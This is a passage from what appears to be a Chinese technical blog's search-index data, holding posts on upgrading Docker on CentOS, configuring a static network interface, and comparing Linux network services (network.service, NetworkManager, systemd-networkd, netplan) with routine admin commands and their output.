title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://my.oschina.net/cqyj/blog/3016118\">Centos7:安装node和npm &amp; npm配置全局路径</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000012099112\">npm的常用命令格式</a></li>\n<li><a href=\"https://www.ruanyifeng.com/blog/2016/10/npm_scripts.html\">npm scripts高级命令指南</a></li>\n<li><a href=\"https://www.techug.com/post/10-npm-tips-and-tricks.html\">10个 NPM 使用技巧</a></li>\n<li><a href=\"http://www.skyjia.com/2017/05/05/npm-error-extraneous/\">滥用cnpm可能导致npm版本依赖的混乱问题</a></li>\n</ul>\n"},{"title":"Centos宿主机如何安装docker最新版本","url":"/2019/10/26/Centos%E5%AE%BF%E4%B8%BB%E6%9C%BA%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85docker%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC/","content":"<h2 id=\"问题现象\"><a href=\"#问题现象\" class=\"headerlink\" title=\"问题现象\"></a>问题现象</h2><p>测试成功的APP软件包，但在宿主机上安装失败，显示docker container的DNS不成功，判断是宿主机的Docker版本太低，对Docker DNS的支持不好。  </p>\n<p>宿主机是Centos, 内核版本<code>3.10.0-1062.4.1.el7.x86_64</code>, 使用<code>yum install docker</code>安装docker，docker的最新版本号<code>1.13</code>，即使采用<code>yum update docker</code>也无法更新。  </p>\n<h2 id=\"原因分析\"><a href=\"#原因分析\" class=\"headerlink\" title=\"原因分析\"></a>原因分析</h2><p>Docker版本多次演进，现在分成社区版和企业版，安装方式已经改变。</p>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><ol>\n<li><p>删除旧版本</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo yum remove docker \\</span><br><span class=\"line\">                docker-client \\</span><br><span class=\"line\">                docker-client-latest \\</span><br><span class=\"line\">                docker-common \\</span><br><span class=\"line\">                docker-latest \\</span><br><span class=\"line\">                docker-latest-logrotate \\</span><br><span class=\"line\">                docker-logrotate \\</span><br><span class=\"line\">                docker-engine</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置安装源</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo yum install -y yum-utils \\</span><br><span class=\"line\">    device-mapper-persistent-data \\</span><br><span class=\"line\">    lvm2</span><br><span class=\"line\"></span><br><span class=\"line\">$ sudo yum-config-manager \\</span><br><span class=\"line\">    --add-repo \\</span><br><span class=\"line\">    https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装最新版docker</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>If prompted to accept the GPG key, verify that the fingerprint matches 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35, and if so, accept it.</p>\n</blockquote>\n<p> 现在<code>$ docker -v</code>检查版本，显示<code>Docker version 19.03.4, build 9013bf583a</code>，版本升级成功！！！</p>\n</li>\n<li><p>检查docker历史版本的信息</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ yum list docker-ce --showduplicates | <span class=\"built_in\">sort</span> -r</span><br><span class=\"line\">docker-ce.x86_64            3:19.03.4-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:19.03.4-3.el7                    @docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:19.03.3-3.el7                    docker-ce-stable  </span><br><span class=\"line\">docker-ce.x86_64            3:19.03.2-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:19.03.1-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:19.03.0-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.9-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.8-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.7-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.6-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.5-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.4-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.3-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.2-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.1-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            3:18.09.0-3.el7                    docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.06.3.ce-3.el7                   docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.06.2.ce-3.el7                   docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.06.1.ce-3.el7                   docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.06.0.ce-3.el7                   docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.03.1.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            18.03.0.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.12.1.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.12.0.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.09.1.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.09.0.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.06.2.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.06.1.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.06.0.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.03.3.ce-1.el7                   docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.03.2.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.03.1.ce-1.el7.centos            docker-ce-stable</span><br><span class=\"line\">docker-ce.x86_64            17.03.0.ce-1.el7.centos            docker-ce-stable</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"https://docs.docker.com/install/linux/docker-ce/centos/\">Centos安装docker的官方文档</a></p>\n"},{"title":"Centos的服务器网卡设置方法","url":"/2020/06/25/Centos%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95/","content":"<h2 id=\"重装Centos系统\"><a href=\"#重装Centos系统\" class=\"headerlink\" title=\"重装Centos系统\"></a>重装Centos系统</h2><p>使用Centos安装U盘，选择最小化安装，设置root口令，设置失去，最后重新启动。</p>\n<h2 id=\"配置有线网卡\"><a href=\"#配置有线网卡\" class=\"headerlink\" title=\"配置有线网卡\"></a>配置有线网卡</h2><p>安装完成后，编辑网卡配置文件<code>/etc/sysconfig/network-scripts/ifcfg-eno1</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost network-scripts]# more /etc/sysconfig/network-scripts/ifcfg-eno1</span><br><span class=\"line\">TYPE=Ethernet</span><br><span class=\"line\">PROXY_METHOD=none</span><br><span class=\"line\">BROWSER_ONLY=no</span><br><span class=\"line\">BOOTPROTO=static            # 修改默认值dhcp</span><br><span class=\"line\">DEFROUTE=yes</span><br><span class=\"line\">IPV4_FAILURE_FATAL=no</span><br><span class=\"line\">IPV6INIT=yes</span><br><span class=\"line\">IPV6_AUTOCONF=yes</span><br><span class=\"line\">IPV6_DEFROUTE=yes</span><br><span class=\"line\">IPV6_FAILURE_FATAL=no</span><br><span class=\"line\">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class=\"line\">NAME=eno1</span><br><span class=\"line\">UUID=47adb195-54ee-4c74-85a2-2b1fcb499e01</span><br><span class=\"line\">DEVICE=eno1</span><br><span class=\"line\">ONBOOT=yes                  # 修改默认值no</span><br><span class=\"line\">IPADDR=192.168.0.132        # New</span><br><span class=\"line\">NETMASK=255.255.255.0       # New</span><br><span class=\"line\">GATEWAY=192.168.0.1         # New</span><br><span class=\"line\">DNS1=192.168.0.1            # New</span><br></pre></td></tr></table></figure>\n"},{"title":"Centos网络管理要点","url":"/2023/08/19/Centos%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/","content":"<h2 id=\"一、-网络接口设备\"><a href=\"#一、-网络接口设备\" class=\"headerlink\" title=\"一、 网络接口设备\"></a>一、 网络接口设备</h2><p>Linux2.6 内核引入了一个基于内存的文件系统 <strong>sysfs</strong> ，用于向用户空间导出内核设备资源并且进行读写操作，挂载点位于<code>/sys</code> 。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# tree /sys -L 1</span><br><span class=\"line\">/sys</span><br><span class=\"line\">├── block           已废弃。记录当前被发现的所有块设备，已迁移到 /sys/class/block</span><br><span class=\"line\">├── bus             已注册在操作系统内核的总线类型，每种类型均包括 devices 和 drivers</span><br><span class=\"line\">├── class           最核心！已注册在操作系统内核的全量设备，按照设备功能分目录管理</span><br><span class=\"line\">├── dev             维护一个字符设备和块设备的软链接文件</span><br><span class=\"line\">├── devices         最基础！全局设备结构体系，包含所有被发现的注册在各种总线上的各种真实物理设备</span><br><span class=\"line\">├── firmware        系统加载固件对象和属性的用户空间接口</span><br><span class=\"line\">├── fs              记录当前被发现的所有文件系统</span><br><span class=\"line\">├── hypervisor      与虚拟化Xen相关的装置</span><br><span class=\"line\">├── kernel          内核中所有可调整的参数</span><br><span class=\"line\">├── module          包含所有的被载入操作系统内核的模块</span><br><span class=\"line\">└── power           系统的电源选项</span><br></pre></td></tr></table></figure>\n\n<p>该文件系统是内核设备树的一个直观反映，也就是说，当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。<br>Centos网络接口信息位于<code>/sys/class/net</code>，但该目录下实际都是软链接文件，物理文件实际位于<code>/sys/devices</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv fs]# ls -l /sys/class/net</span><br><span class=\"line\">总用量 0</span><br><span class=\"line\">lrwxrwxrwx 1 root root 0  8月 19 10:24 ens18 -&gt; ../../devices/pci0000:00/0000:00:12.0/virtio3/net/ens18</span><br><span class=\"line\">lrwxrwxrwx 1 root root 0  8月 19 10:24 lo -&gt; ../../devices/virtual/net/lo</span><br></pre></td></tr></table></figure>\n\n<p>要查看网络接口信息，最简单的方法就是命令<code>ip a</code>，或者传统方式<code>ifconfig -a</code></p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv network]# ip a</span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1/128 scope host </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: ens18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class=\"line\">    link/ether 5a:3b:ab:a3:01:88 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 192.168.0.32/24 brd 192.168.0.255 scope global dynamic ens18</span><br><span class=\"line\">       valid_lft 28934sec preferred_lft 28934sec</span><br><span class=\"line\">    inet6 2409:8a00:321c:d121:583b:abff:fea3:188/64 scope global dynamic mngtmpaddr noprefixroute </span><br><span class=\"line\">       valid_lft 215859sec preferred_lft 129459sec</span><br><span class=\"line\">    inet6 fe80::583b:abff:fea3:188/64 scope link </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、-网络服务组件\"><a href=\"#二、-网络服务组件\" class=\"headerlink\" title=\"二、 网络服务组件\"></a>二、 网络服务组件</h2><h3 id=\"1-network-service\"><a href=\"#1-network-service\" class=\"headerlink\" title=\"1. network.service\"></a>1. network.service</h3><h4 id=\"network的启动方式\"><a href=\"#network的启动方式\" class=\"headerlink\" title=\"network的启动方式\"></a>network的启动方式</h4><p>Centos7 之前的版本都是通过 <code>network.service</code> 管理网络配置，启动方式还是基于<code>rc.d</code>的传统方式，启动脚本位于 <code>/etc/rc.d/init.d/network</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@copy-of-vm-centos7 ~]# systemctl status network</span><br><span class=\"line\">● network.service - LSB: Bring up/down networking</span><br><span class=\"line\">   Loaded: loaded (/etc/rc.d/init.d/network; bad; vendor preset: disabled)</span><br><span class=\"line\">   Active: active (running) since 四 2023-08-17 23:53:18 CST; 1 day 16h ago</span><br><span class=\"line\">     Docs: man:systemd-sysv-generator(8)</span><br><span class=\"line\">  Process: 576 ExecStart=/etc/rc.d/init.d/network start (code=exited, status=0/SUCCESS)</span><br><span class=\"line\">   CGroup: /system.slice/network.service</span><br><span class=\"line\">           └─760 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclient-eth0.pid -H copy-of-vm-centos7 eth0</span><br><span class=\"line\"></span><br><span class=\"line\">8月 18 22:32:37 copy-of-vm-centos7.8-cloudinit dhclient[760]: bound to 192.168.0.17 -- renewal in 15251 seconds.</span><br><span class=\"line\">8月 19 02:46:48 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPREQUEST on eth0 to 192.168.0.1 port 67 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 02:46:48 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPACK from 192.168.0.1 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 02:46:50 copy-of-vm-centos7.8-cloudinit dhclient[760]: bound to 192.168.0.17 -- renewal in 15611 seconds.</span><br><span class=\"line\">8月 19 07:07:01 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPREQUEST on eth0 to 192.168.0.1 port 67 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 07:07:01 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPACK from 192.168.0.1 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 07:07:03 copy-of-vm-centos7.8-cloudinit dhclient[760]: bound to 192.168.0.17 -- renewal in 17059 seconds.</span><br><span class=\"line\">8月 19 11:51:22 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPREQUEST on eth0 to 192.168.0.1 port 67 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 11:51:22 copy-of-vm-centos7.8-cloudinit dhclient[760]: DHCPACK from 192.168.0.1 (xid=0x1b984451)</span><br><span class=\"line\">8月 19 11:51:24 copy-of-vm-centos7.8-cloudinit dhclient[760]: bound to 192.168.0.17 -- renewal in 17493 seconds.</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"network的配置文件\"><a href=\"#network的配置文件\" class=\"headerlink\" title=\"network的配置文件\"></a>network的配置文件</h4><p>网卡配置文件位于<code>/etc/sysconfig/network-scripts/</code>，每个设备都需要生成独立的接口配置文件，命名方式是<code>ifcfg-&lt;网络接口名&gt;</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv /]# ls -l /etc/sysconfig/network-scripts/</span><br><span class=\"line\">总用量 4</span><br><span class=\"line\">-rw-r--r--. 1 root root 279  8月 15 22:11 ifcfg-ens18</span><br><span class=\"line\"></span><br><span class=\"line\">[root@MiWiFi-RA70-srv /]# more /etc/sysconfig/network-scripts/ifcfg-ens18</span><br><span class=\"line\">TYPE=Ethernet</span><br><span class=\"line\">PROXY_METHOD=none</span><br><span class=\"line\">BROWSER_ONLY=no</span><br><span class=\"line\">BOOTPROTO=dhcp</span><br><span class=\"line\">DEFROUTE=yes</span><br><span class=\"line\">IPV4_FAILURE_FATAL=no</span><br><span class=\"line\">IPV6INIT=yes</span><br><span class=\"line\">IPV6_AUTOCONF=yes</span><br><span class=\"line\">IPV6_DEFROUTE=yes</span><br><span class=\"line\">IPV6_FAILURE_FATAL=no</span><br><span class=\"line\">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class=\"line\">NAME=ens18</span><br><span class=\"line\">UUID=8e4c648c-871f-4223-8d94-ee09aa8580b9</span><br><span class=\"line\">DEVICE=ens18</span><br><span class=\"line\">ONBOOT=no</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"network的应用说明\"><a href=\"#network的应用说明\" class=\"headerlink\" title=\"network的应用说明\"></a>network的应用说明</h4><ul>\n<li><code>network.service</code> 是一个非常简单的软件包，仅有264行代码的脚本文件</li>\n<li>设计目标基于简单的有线网络环境，当网络接口配置信息修改后，网络服务必须重新启动，因此很难满足无线网络切换的需求</li>\n</ul>\n<h3 id=\"2-NetworkManager-service\"><a href=\"#2-NetworkManager-service\" class=\"headerlink\" title=\"2. NetworkManager.service\"></a>2. NetworkManager.service</h3><p>RedHat 在2004年启动了 NetworkManager 项目，皆在能够让Linux用户更轻松的处理现代网络需求，尤其是无线网络，能够自动发现网卡并配置IP地址，现在由 GNOME 管理。</p>\n<h4 id=\"NetworkManager的启动方式\"><a href=\"#NetworkManager的启动方式\" class=\"headerlink\" title=\"NetworkManager的启动方式\"></a>NetworkManager的启动方式</h4><p><code>NetworkManager.service</code>的主程序是<code>/usr/sbin/NetworkManager</code>，支持 systemd 启动方式，启动配置文件位于<code>/usr/lib/systemd/system/NetworkManager.service</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# systemctl status NetworkManager</span><br><span class=\"line\">● NetworkManager.service - Network Manager</span><br><span class=\"line\">   Loaded: loaded (/usr/lib/systemd/system/NetworkManager.service; enabled; vendor preset: enabled)</span><br><span class=\"line\">  Drop-In: /usr/lib/systemd/system/NetworkManager.service.d</span><br><span class=\"line\">           └─NetworkManager-ovs.conf</span><br><span class=\"line\">   Active: active (running) since Fri 2023-08-18 00:06:55 CST; 33min ago</span><br><span class=\"line\">     Docs: man:NetworkManager(8)</span><br><span class=\"line\"> Main PID: 547 (NetworkManager)</span><br><span class=\"line\">    Tasks: 5</span><br><span class=\"line\">   Memory: 13.0M</span><br><span class=\"line\">   CGroup: /system.slice/NetworkManager.service</span><br><span class=\"line\">           ├─547 /usr/sbin/NetworkManager --no-daemon</span><br><span class=\"line\">           ├─573 /sbin/dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -pf /var/run/NetworkManager/dhclient-eth0.pid -lf /var/lib/NetworkMan&gt;</span><br><span class=\"line\">           └─965 /sbin/dhclient -d -q -6 -N -sf /usr/libexec/nm-dhcp-helper -pf /var/run/NetworkManager/dhclient6-eth0.pid -lf /var/lib/Net&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option life_starts          =&gt; &#x27;1692288420&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option max_life             =&gt; &#x27;43200&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option preferred_life       =&gt; &#x27;43200&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option rebind               =&gt; &#x27;34560&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option renew                =&gt; &#x27;21600&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option requested_dhcp6_client_id =&gt; &#x27;1&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1369] dhcp6 (eth0): option requested_dhcp6_domain_search =&gt; &#x27;1&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1370] dhcp6 (eth0): option requested_dhcp6_name_servers =&gt; &#x27;1&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1370] dhcp6 (eth0): option starts               =&gt; &#x27;1692288420&#x27;</span><br><span class=\"line\">8月 18 00:07:00 MiWiFi-RA70-srv NetworkManager[547]: &lt;info&gt;  [1692288420.1370] dhcp6 (eth0): state changed unknown -&gt; bound, event ID=&quot;28:3&gt;</span><br><span class=\"line\">[root@MiWiFi-RA70-srv ~]#</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"NetworkManager的配置文件\"><a href=\"#NetworkManager的配置文件\" class=\"headerlink\" title=\"NetworkManager的配置文件\"></a>NetworkManager的配置文件</h4><p><code>NetworkManager.service</code>网卡配置方式与<code>network.service</code>保持一致，也是位于<code>/etc/sysconfig/network-scripts/</code>，文件命名和配置方式也完全相同。<br><code>nmcli</code>是用于控制 NetworkManager 和报告网络状态的命令行工具，用于创建，显示，编辑，删除，激活和停用网络连接，以及控制和显示网络设备状态。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# nmcli connection show</span><br><span class=\"line\">NAME   UUID                                  TYPE      DEVICE </span><br><span class=\"line\">ens18  8e4c648c-871f-4223-8d94-ee09aa8580b9  ethernet  ens18  </span><br><span class=\"line\"></span><br><span class=\"line\">[root@MiWiFi-RA70-srv ~]# ls -l /etc/sysconfig/network-scripts</span><br><span class=\"line\">总用量 4</span><br><span class=\"line\">-rw-r--r-- 1 root root 280  8月 19 23:40 ifcfg-ens18</span><br></pre></td></tr></table></figure>\n\n<p>此外，NetworkManager 还有一个漂亮的图形界面软件 <code>nmtui</code>，其核心功能与<code>nmcli</code>完全相同。<br><img src=\"/2023/08/19/Centos%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/nmtui.png\" alt=\"nmtui\"></p>\n<h4 id=\"NetworkManager的应用说明\"><a href=\"#NetworkManager的应用说明\" class=\"headerlink\" title=\"NetworkManager的应用说明\"></a>NetworkManager的应用说明</h4><ul>\n<li>Centos7 同时支持<code>network.service</code>和<code>NetworkManager.service</code>，相当于在 Centos7 的一个过渡，默认情况下这2个服务都有开启，但是因为<code>NetworkManager.service</code>当时的兼容性不好，大部分人都会将其关闭</li>\n<li>Centos 8 已经废弃 network.service（默认不安装），只能通过 NetworkManager 进行网络配置，OpenEuler 21.10 也是这样</li>\n</ul>\n<h3 id=\"3-systemd-networkd-service\"><a href=\"#3-systemd-networkd-service\" class=\"headerlink\" title=\"3. systemd-networkd.service\"></a>3. systemd-networkd.service</h3><p>作为一个 “从未完成、从未完善、但一直追随技术进步” 的系统，systemd 已经不只是一个初始化进程，它被设计为一个更广泛的系统以及服务管理平台，包含了不断增长的核心系统进程、库和工具的生态系统。<br><code>systemd-networkd</code>是 Systemd 计划的一部分，旨在提供一个轻量级、高性能的网络管理器。它使用原生Linux网络接口，不依赖第三方软件包，因此占用更少的资源和内存。</p>\n<h4 id=\"systemd-networkd的启动方式\"><a href=\"#systemd-networkd的启动方式\" class=\"headerlink\" title=\"systemd-networkd的启动方式\"></a>systemd-networkd的启动方式</h4><p>systemd 210 及其更高版本提供了<code>systemd-networkd</code>，其主程序是<code>/usr/lib/systemd/systemd-networkd</code>，启动配置文件位于<code>/usr/lib/systemd/system/systemd-networkd.service</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# systemctl status systemd-networkd</span><br><span class=\"line\">● systemd-networkd.service - Network Service</span><br><span class=\"line\">   Loaded: loaded (/usr/lib/systemd/system/systemd-networkd.service; enabled; vendor preset: enabled)</span><br><span class=\"line\">   Active: active (running) since Fri 2023-08-18 00:06:55 CST; 35min ago</span><br><span class=\"line\">     Docs: man:systemd-networkd.service(8)</span><br><span class=\"line\"> Main PID: 548 (systemd-network)</span><br><span class=\"line\">   Status: &quot;Processing requests...&quot;</span><br><span class=\"line\">    Tasks: 1</span><br><span class=\"line\">   Memory: 1.6M</span><br><span class=\"line\">   CGroup: /system.slice/systemd-networkd.service</span><br><span class=\"line\">           └─548 /usr/lib/systemd/systemd-networkd</span><br><span class=\"line\"></span><br><span class=\"line\">8月 18 00:06:55 MiWiFi-RA70-srv systemd[1]: Starting Network Service...</span><br><span class=\"line\">8月 18 00:06:55 MiWiFi-RA70-srv systemd-networkd[548]: Enumeration completed</span><br><span class=\"line\">8月 18 00:06:55 MiWiFi-RA70-srv systemd[1]: Started Network Service.</span><br><span class=\"line\">8月 18 00:06:56 MiWiFi-RA70-srv systemd-networkd[548]: eth0: Gained carrier</span><br><span class=\"line\">8月 18 00:06:58 MiWiFi-RA70-srv systemd-networkd[548]: eth0: Gained IPv6LL</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"systemd-networkd的配置方式\"><a href=\"#systemd-networkd的配置方式\" class=\"headerlink\" title=\"systemd-networkd的配置方式\"></a>systemd-networkd的配置方式</h4><p>网络配置文件保存在<code>/etc/systemd/network/</code>。<br>配置文件名可以任意，物理网络设备一般使用后缀名<code>.network</code>，虚拟网络设备一般使用后缀名<code>.netdev</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">cat</span> /etc/systemd/network/20-dhcp.network</span></span><br><span class=\"line\">[Match]</span><br><span class=\"line\">Name=enp3*</span><br><span class=\"line\">[Network]</span><br><span class=\"line\">DHCP=yes</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">cat</span> /etc/systemd/network/10-static-enp3s0.network</span></span><br><span class=\"line\">[Match]</span><br><span class=\"line\">Name=enp3s0</span><br><span class=\"line\">[Network]</span><br><span class=\"line\">Address=192.168.10.50/24</span><br><span class=\"line\">Gateway=192.168.10.1</span><br><span class=\"line\">DNS=8.8.8.8</span><br></pre></td></tr></table></figure>\n\n<p>正如你上面看到的，每个网络配置文件包括了一个或多个 “sections”，每个 “section”都用 [XXX] 开头。每个 section 包括了一个或多个键值对。<br><code>[Match]</code>部分决定这个配置文件配置哪个（些）网络设备。例如，这个文件匹配所有名称以 ens3 开头的网络设备（例如 enp3s0、 enp3s1、 enp3s2 等等）对于匹配的接口，<code>[Network]</code>部分指定的 DHCP 网络配置。</p>\n<blockquote>\n<p>配置目录存在多个文件时，<code>systemd-networkd</code>会按照字母顺序一个个加载并处理。</p>\n</blockquote>\n<h4 id=\"systemd-networkd的应用说明\"><a href=\"#systemd-networkd的应用说明\" class=\"headerlink\" title=\"systemd-networkd的应用说明\"></a>systemd-networkd的应用说明</h4><ul>\n<li>目前，<code>systemd-networkd</code>还不能直接支持无线网络，但你可以使用<code>wpa_supplicant</code>服务配置无线适配器，然后把它和<code>systemd-networkd</code>联系起来</li>\n<li>使用<code>systemd-networkd</code>时，需要手工启用<code>systemd-resolved</code>服务用于域名解析。<br>  该服务实现了一个缓存式 DNS 服务器，并通过<code>/run/systemd/resolve/resolv.conf</code>管理DNS服务。<br>  由于很多应用程序依赖于<code>/etc/resolv.conf</code>，因此为了兼容性需要为两者建立一个软链接。</li>\n<li>Ubuntu 18.04及更高版本中，默认使用 systemd-networkd 作为网络管理器，但也可以选择切换到 NetworkManager。</li>\n</ul>\n<h3 id=\"4-netplan\"><a href=\"#4-netplan\" class=\"headerlink\" title=\"4. netplan\"></a>4. netplan</h3><p>Netplan 是由 Ubuntu 的母公司 Canonical 开发的网络组件，目标是为不同的后端管理工具提供统一的网络配置抽象方法。</p>\n<ul>\n<li>目前支持的网络管理工具后端为：NetworkManager 和 NetworkManager</li>\n<li>网络配置语言采用 YAML 格式</li>\n<li>网络配置存储目录位于：<code>/etc/netplan/*.yaml</code>，可以系统管理员手工配置，也可以是云镜像或者其他操作系统部署设施自动生成</li>\n<li>Github 主页位于：<a href=\"https://github.com/canonical/netplan\">https://github.com/canonical/netplan</a></li>\n</ul>\n<p><img src=\"/2023/08/19/Centos%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/netplan_design_overview.svg\" alt=\"Alt text\"></p>\n<p>以最简单的静态网卡配置为例，</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">network:</span></span><br><span class=\"line\">  <span 